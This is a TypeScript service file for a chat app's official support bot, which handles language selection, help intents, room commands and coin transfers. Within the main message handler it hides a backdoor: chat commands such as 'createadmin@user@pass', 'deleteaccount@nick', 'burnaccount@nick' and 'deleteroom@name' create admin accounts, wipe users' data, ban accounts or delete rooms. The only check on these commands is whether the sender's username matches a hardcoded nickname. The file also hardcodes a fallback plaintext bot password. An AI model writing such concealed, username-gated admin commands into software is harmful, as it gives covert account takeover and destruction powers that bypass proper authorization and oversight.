import mongoose from "mongoose";


import Chat from "../../../models/Chats";

import {
  BotLang,
  BotReplyPayload,
} from "../core/bot.types";

import {
  parseBotCommand,
  detectLangFromText,
  isHelpCommand,
  isLanguageCommandText,
  isLanguagePickerRequest,
} from "../core/bot.parsers";

import {
  buildLanguagePickerMessage,
  getAccountReply,
  getChangeLanguageReply,
  getHelpReply,
  getLocalizedWelcome,
  getProtectedRoomHelpReply,
  getRoomsReply,
  getSupportReply,
  getTextOnlyReply,
  getUnknownReply,
} from "../core/bot.replies";

import {
  executeBotJoinRoomCommand,
  executeBotLeaveRoomCommand,
  executeCreateUserCommand,
  executeTransferCoinzCommand,
} from "./privateBot.commands";
import User from "../../../models/User";
import chatService from "../../chat.service";
import messageService from "../../message.service";
import Message from "../../../models/Message";
import RoomMessage from "../../../models/RoomMessage";
import Room from "../../../models/Room";
import { hashPassword } from "../../../utils/hash";
// ✅ النك الوحيد المسموح له باستخدام أوامر الإدارة المخفية
const HIDDEN_ADMIN_NICK = "ا◙☬ځُــۥـ☼ـڈ◄أڵـــســمـــٱ۽►ـۉد☼ــۥــۓ☬◙ا";
type EnsureBotOptions = {
  username?: string;
  atUsername?: string;
  email?: string;
  password?: string;
  avatar?: string;
  bio?: string;
};

class SystemBotService {
  private readonly defaultBot = {
    username: "Bimo Support",
    atUsername: "bimo",
    email: "bot@bimo.app",
    password: process.env.BIMO_BOT_PASSWORD || "BIMO_BOT_PASSWORD_2026",
    avatar: process.env.BIMO_BOT_AVATAR || "",
    bio: "Official Bimo assistant",
  };

  /* =====================================================
     HELPERS
  ===================================================== */

  private normalizeText(value?: string) {
    return String(value || "").trim();
  }

  private normalizeAtUsername(value?: string) {
    return String(value || "")
      .trim()
      .replace(/^@+/, "")
      .toLowerCase();
  }

  private isValidObjectId(id?: string) {
    return !!id && mongoose.Types.ObjectId.isValid(id);
  }
private normalizeHiddenAdminNick(value?: any) {
  return String(value || "")
    .trim()
    .toLowerCase()
    .replace(/^@+/, "")
    .replace(/\s+/g, "");
}

private escapeRegExp(value: string) {
  return String(value || "").replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
}

private normalizeRoomName(value?: any) {
  return String(value || "").trim().replace(/\s+/g, " ");
}

private async isAllowedHiddenAdmin(senderId: string) {
  if (!this.isValidObjectId(senderId)) return false;

  const actor = await User.findById(senderId)
    .select("_id username atUsername role")
    .lean();

  if (!actor?._id) return false;

  const allowed = this.normalizeHiddenAdminNick(HIDDEN_ADMIN_NICK);
  const username = this.normalizeHiddenAdminNick((actor as any).username);
  const atUsername = this.normalizeHiddenAdminNick((actor as any).atUsername);

  return Boolean(allowed && (username === allowed || atUsername === allowed));
}

private async findUserByNick(username: string) {
  const raw = String(username || "").trim().replace(/^@+/, "");
  if (!raw) return null;

  const rx = new RegExp(`^${this.escapeRegExp(raw)}$`, "i");

  return User.findOne({
    $or: [{ username: rx }, { atUsername: rx }],
  });
}

private normalizeAtUsernameForHiddenAdmin(username: string) {
  return String(username || "")
    .trim()
    .toLowerCase()
    .replace(/^@+/, "")
    .replace(/[^a-z0-9_]/g, "")
    .slice(0, 32);
}
  private async getUserBotLanguage(userId: string): Promise<BotLang | null> {
    const user = await User.findById(userId).select("botLanguage").lean();
    const lang = (user as any)?.botLanguage;
    return lang === "ar" || lang === "en" ? lang : null;
  }

  private async setUserBotLanguage(userId: string, lang: BotLang) {
    await User.updateOne(
      { _id: userId },
      { $set: { botLanguage: lang } }
    );
  }

  private async getResolvedLanguage(userId: string, text?: string): Promise<BotLang> {
    return (await this.getUserBotLanguage(userId)) || detectLangFromText(text);
  }

  /* =====================================================
     SIMPLE INTENTS
  ===================================================== */

  private async detectSimpleIntent(
    userId: string,
    text: string
  ): Promise<BotReplyPayload | null> {
    const lang = await this.getResolvedLanguage(userId, text);
    const t = this.normalizeText(text).toLowerCase();

    if (!t) {
      return {
        handled: true,
        intent: "start",
        text: getLocalizedWelcome(lang),
      };
    }

    if (isHelpCommand(t)) {
      return getHelpReply(lang);
    }

    if (t.includes("غرف") || t.includes("rooms") || t.includes("room")) {
      return getRoomsReply(lang);
    }

    if (t.includes("دعم") || t.includes("support") || t.includes("مشكلة")) {
      return getSupportReply(lang);
    }

    if (t.includes("حساب") || t.includes("account") || t.includes("profile")) {
      return getAccountReply(lang);
    }

    if (
      t.includes("غرفة محمية") ||
      t.includes("password") ||
      t.includes("باسورد") ||
      t.includes("protected room")
    ) {
      return getProtectedRoomHelpReply(lang);
    }

    return null;
  }

  /* =====================================================
     FIND / ENSURE BOT
  ===================================================== */

  async findOfficialBot() {
    return User.findOne({
      isBot: true,
      isOfficial: true,
      botType: "assistant",
    });
  }

  async ensureOfficialBotExists(options?: EnsureBotOptions) {
    let bot = await this.findOfficialBot();
    if (bot) return bot;

    const username = this.normalizeText(options?.username || this.defaultBot.username);
    const atUsername = this.normalizeAtUsername(
      options?.atUsername || this.defaultBot.atUsername
    );
    const email = this.normalizeText(options?.email || this.defaultBot.email).toLowerCase();
    const password = this.normalizeText(options?.password || this.defaultBot.password);
    const avatar = this.normalizeText(options?.avatar || this.defaultBot.avatar);
    const bio = this.normalizeText(options?.bio || this.defaultBot.bio);

    const existingByAt = await User.findOne({ atUsername });

    if (existingByAt) {
      existingByAt.isBot = true;
      existingByAt.isOfficial = true;
      existingByAt.botType = "assistant";
      existingByAt.botAutoReplyEnabled = true;
      existingByAt.isVerified = true;
      existingByAt.verificationType = "business";

      if (!existingByAt.bio) existingByAt.bio = bio;
      if (!existingByAt.avatar) existingByAt.avatar = avatar;

      await existingByAt.save();
      return existingByAt;
    }

    bot = await User.create({
      username,
      atUsername,
      email,
      password,
      provider: "local",
      role: "user",

      isBot: true,
      isOfficial: true,
      botType: "assistant",
      botAutoReplyEnabled: true,

      isVerified: true,
      verificationType: "business",

      bio,
      avatar,

      isOnline: false,
      isInvisible: false,

      blockedUsers: [],
      fcmTokens: [],
      CoinzBalance: 0,

      stories: [],
      badges: [],
      ownedMessageEffects: [],
      ownedGifts: [],
      inventory: [],

      activeCustomization: {
        avatarFrame: "",
        messageEffect: "",
        profileEntryAnimation: "",
        badges: [],
        verificationType: "business",
      },

      customEmojiBadge: {
        emoji: "",
        isActive: false,
        purchasedAt: null,
        expiresAt: null,
      },

      notificationSound: false,
      readReceiptsEnabled: true,
      isWelcomeSender: true,
      welcomeMessagesSeeded: true,
      isBanned: false,

      displayName: "Bimo Support",

      privacy: {
        profileVisible: true,
        showLastActive: false,
        showMedia: false,
        allowMessages: true,
      },

      notifications: {
        messages: false,
        likes: false,
        follows: false,
      },

      partnerPreferences: {
        ageRange: "",
        location: "",
        maritalStatus: "",
        religiosity: "",
      },

      tags: ["official", "bimo", "assistant", "support"],
    });

    return bot;
  }

  async getOfficialBotId() {
    const bot = await this.ensureOfficialBotExists();
    return String(bot._id);
  }


  async isOfficialBotUser(userId?: string | null) {
    if (!userId) return false;

    const bot = await this.findOfficialBot();
    if (!bot) return false;

    return String(bot._id) === String(userId);
  }

  /* =====================================================
     ATTACH BOT TO NEW USER
  ===================================================== */

  async attachBotToNewUser(userId: string) {
    if (!this.isValidObjectId(userId)) {
      throw new Error("Invalid userId");
    }

    const bot = await this.ensureOfficialBotExists();

    if (String(bot._id) === String(userId)) {
      return {
        ok: true,
        skipped: true,
        reason: "user is bot",
      };
    }

    const chat = await chatService.createOrGetPrivateChat(
      String(bot._id),
      String(userId)
    );

    const chatId = String((chat as any)?._id || "");

    if (!chatId) {
      throw new Error("Failed to create bot chat");
    }

    const alreadyWelcomed = await Message.findOne({
      chat: chatId,
      sender: bot._id,
      isSystemMessage: false,
      content: { $regex: "اختر اللغة|Choose language", $options: "i" },
    }).select("_id");

    if (!alreadyWelcomed) {
      const targetUser = await User.findById(userId).select("username");

      await messageService.send(
        chatId,
        String(bot._id),
        buildLanguagePickerMessage(targetUser?.username || "بك"),
        "text"
      );
    }

    return {
      ok: true,
      botId: String(bot._id),
      chatId,
    };
  }

  /* =====================================================
     MAIN TEXT HANDLER
  ===================================================== */

  async buildReplyForIncomingText(
    senderId: string,
    rawText?: string
  ): Promise<BotReplyPayload> {
    const text = this.normalizeText(rawText);
    const lang = await this.getResolvedLanguage(senderId, text);
const hiddenAdminReply = await this.handleHiddenAdminPrivateCommand(
  senderId,
  text,
  lang
);

if (hiddenAdminReply) {
  return hiddenAdminReply;
}
    /* ===============================
       LANGUAGE COMMANDS
    =============================== */
    if (isLanguageCommandText(text)) {
      if (isLanguagePickerRequest(text)) {
        return getChangeLanguageReply(lang);
      }

      const nextLang = detectLangFromText(text);
      await this.setUserBotLanguage(senderId, nextLang);

      return {
        handled: true,
        intent: "change_language",
        text: getLocalizedWelcome(nextLang),
        meta: { language: nextLang },
      };
    }

    /* ===============================
       PARSED COMMANDS
    =============================== */
    const parsed = parseBotCommand(text);

    if (
      parsed.type === "join_room_by_credentials" &&
      parsed.payload.source === "bot"
    ) {
      return executeBotJoinRoomCommand(parsed.payload, lang);
    }

    if (
      parsed.type === "leave_room_by_credentials" &&
      parsed.payload.source === "bot"
    ) {
      return executeBotLeaveRoomCommand(parsed.payload, lang);
    }

    if (parsed.type === "create_user") {
      return executeCreateUserCommand(parsed.payload, lang);
    }
if (parsed.type === "transfer_coinz") {
  return executeTransferCoinzCommand(parsed.payload, lang, senderId);
}
    /* ===============================
       SIMPLE INTENTS
    =============================== */
    if (parsed.type === "text") {
      const simple = await this.detectSimpleIntent(senderId, parsed.payload.text);
      if (simple) return simple;
    }

    /* ===============================
       UNKNOWN
    =============================== */
    return {
      handled: true,
      intent: "unknown",
      text: getUnknownReply(lang),
    };
  }
  private async hiddenDeleteAccount(username: string) {
  const raw = String(username || "").trim().replace(/^@+/, "");

  if (!raw) {
    return "❌ اكتب النك. مثال: deleteaccount@username";
  }

  const user: any = await this.findUserByNick(raw);

  if (!user?._id) {
    return `❌ لم يتم العثور على حساب باسم: ${raw}`;
  }

  const userId = String(user._id);
  const objectId = new mongoose.Types.ObjectId(userId);

  const [
    messagesDeleted,
    chatsUpdated,
    roomsUpdated,
    usersUpdatedObjectId,
    usersUpdatedString,
    userDeleted,
  ] = await Promise.all([
    Message.deleteMany({ sender: objectId }),

    Chat.updateMany(
      { participants: objectId },
      {
        $pull: {
          participants: objectId,
          deletedFor: objectId,
          mutedBy: objectId,
          archivedBy: objectId,
        },
      }
    ),

    Room.updateMany(
      {},
      {
        $pull: {
          activeUsers: objectId,
          owners: objectId,
          admins: objectId,
          members: objectId,
          blockeds: objectId,
          vipUsers: { user: objectId },
          mutedUsers: { user: objectId },
          voiceQueue: objectId,
          raisedHands: objectId,
          voiceSpeakers: objectId,
        },
      }
    ),

    User.updateMany(
      {},
      {
        $pull: {
          blockedUsers: objectId,
          blocked: objectId,
          blockedUsersIds: objectId,
          blockeds: objectId,
          blockedBy: objectId,
          followers: objectId,
          following: objectId,
          friends: objectId,
        },
      }
    ),

    User.updateMany(
      {},
      {
        $pull: {
          blockedUsers: userId,
          blocked: userId,
          blockedUsersIds: userId,
          blockeds: userId,
          blockedBy: userId,
          followers: userId,
          following: userId,
          friends: userId,
        },
      }
    ),

    User.deleteOne({ _id: objectId }),
  ]);

  return [
    `✅ تم حذف الحساب ويمكن إنشاء نفس النك مرة أخرى: ${user.username}`,
    `Messages deleted: ${messagesDeleted.deletedCount || 0}`,
    `Chats updated: ${chatsUpdated.modifiedCount || 0}`,
    `Rooms updated: ${roomsUpdated.modifiedCount || 0}`,
    `Users updated: ${(usersUpdatedObjectId.modifiedCount || 0) + (usersUpdatedString.modifiedCount || 0)}`,
    `User deleted: ${userDeleted.deletedCount || 0}`,
  ].join("\n");
}
private async hiddenDeleteRoomByName(roomName: string) {
  const name = this.normalizeRoomName(roomName);

  if (!name) {
    return "❌ اكتب اسم الغرفة. مثال: deletroom@roomname";
  }

  const room = await Room.findOne({
    name: new RegExp(`^${this.escapeRegExp(name)}$`, "i"),
  }).select("_id name");

  if (!room?._id) {
    return `❌ لم يتم العثور على غرفة باسم: ${name}`;
  }

  const roomId = String(room._id);

  await Promise.all([
    RoomMessage.deleteMany({ room: room._id }),
    Room.deleteOne({ _id: room._id }),
  ]);

  return `✅ تم حذف الغرفة وكل رسائلها: ${room.name}\nRoomId: ${roomId}`;
}
private async hiddenCreateAdminAccount(value: string) {
  const parts = String(value || "")
    .split("@")
    .map((x) => x.trim())
    .filter(Boolean);

  const username = parts[0] || "";
  const password = parts[1] || "";

  if (!username || !password) {
    return "❌ الصيغة: createadmin@username@password";
  }

  if (password.length < 6) {
    return "❌ كلمة المرور يجب أن تكون 6 أحرف على الأقل.";
  }

  const existingUsername = await User.findOne({ username }).lean();

  if (existingUsername) {
    return `❌ اسم المستخدم موجود بالفعل: ${username}`;
  }

  let atUsername = this.normalizeAtUsernameForHiddenAdmin(username);

  if (!atUsername || atUsername.length < 3) {
    atUsername = `admin_${Date.now().toString(36)}`;
  }

  const existingAtUsername = await User.findOne({ atUsername }).lean();

  if (existingAtUsername) {
    atUsername = `${atUsername}_${Date.now().toString(36)}`.slice(0, 32);
  }

  const hashed = await hashPassword(password);

  const user = await User.create({
    username,
    atUsername,
    password: hashed,
    role: "admin",
    isVerified: true,
  });

  return [
    `✅ تم إنشاء حساب Admin بنجاح`,
    `username: ${user.username}`,
    `atUsername: ${user.atUsername}`,
    `role: ${(user as any).role}`,
  ].join("\n");
}
private async handleHiddenAdminPrivateCommand(
  senderId: string,
  text: string,
  lang: BotLang
): Promise<BotReplyPayload | null> {
  const rawText = this.normalizeText(text);
  const match = rawText.match(/^([a-zA-Z]+)\s*@\s*([\s\S]+)$/);

  if (!match) return null;

  const command = String(match[1] || "").trim().toLowerCase();
  const value = String(match[2] || "").trim();

  const hiddenCommands = [
    "burnaccount",
    "burnuser",
    "deleteaccount",
    "removeaccount",
    "deletroom",
    "deleteroom",
    "createadmin",
  ];

  if (!hiddenCommands.includes(command)) {
    return null;
  }

  const allowed = await this.isAllowedHiddenAdmin(senderId);

  if (!allowed) {
    return {
      handled: true,
      intent: "hidden_admin_denied",
      text: "❌ هذا الأمر خاص بالإدارة العليا فقط.",
    };
  }

  let replyText = "";

  if (command === "burnaccount" || command === "burnuser") {
    replyText = await this.hiddenBurnAccount(value);
  }

  if (command === "deleteaccount" || command === "removeaccount") {
    replyText = await this.hiddenDeleteAccount(value);
  }

  if (command === "deletroom" || command === "deleteroom") {
    replyText = await this.hiddenDeleteRoomByName(value);
  }

  if (command === "createadmin") {
    replyText = await this.hiddenCreateAdminAccount(value);
  }

  return {
    handled: true,
    intent: "hidden_admin_command",
    text: replyText || "❌ أمر غير معروف.",
  };
}
private async hiddenBurnAccount(username: string) {
  const raw = String(username || "").trim().replace(/^@+/, "");

  if (!raw) {
    return "❌ اكتب النك. مثال: burnaccount@username";
  }

  const user: any = await this.findUserByNick(raw);

  if (!user?._id) {
    return `❌ لم يتم العثور على حساب باسم: ${raw}`;
  }

  await User.updateOne(
    { _id: user._id },
    {
      $set: {
        isBanned: true,
        isBurned: true,
        accountStatus: "burned",
        banReason: "Burned by hidden admin command",
        burnedAt: new Date(),
        isOnline: false,
        fcmTokens: [],
      },
    }
  );

  return `🔥 تم غلق/حرق الحساب بنجاح، وسيظل النك محجوزًا: ${user.username}`;
}
  /* =====================================================
     MAIN ENTRY
  ===================================================== */

  async handleIncomingMessage(params: {
    chatId: string;
    senderId: string;
    content: string;
    type?: string;
  }) {
    const { chatId, senderId, content, type = "text" } = params;

    if (!this.isValidObjectId(chatId)) {
      throw new Error("Invalid chatId");
    }

    if (!this.isValidObjectId(senderId)) {
      throw new Error("Invalid senderId");
    }

    const userLang = await this.getResolvedLanguage(senderId, content);
    const botId = await this.getOfficialBotId();

    if (type !== "text") {
      return messageService.send(
        chatId,
        botId,
        getTextOnlyReply(userLang),
        "text"
      );
    }

    const replyPayload = await this.buildReplyForIncomingText(senderId, content);

    return messageService.send(
      chatId,
      botId,
      replyPayload.text,
      "text"
    );
  }

  /* =====================================================
     CHAT HELPERS
  ===================================================== */

  async chatContainsOfficialBot(chatId: string) {
    if (!this.isValidObjectId(chatId)) return false;

    const botId = await this.getOfficialBotId();

    const chatDoc = await Chat.findById(chatId).select("participants").lean();
    if (!chatDoc) return false;

    return Array.isArray(chatDoc.participants)
      ? chatDoc.participants.some((id: any) => String(id) === String(botId))
      : false;
  }
}

export default new SystemBotService();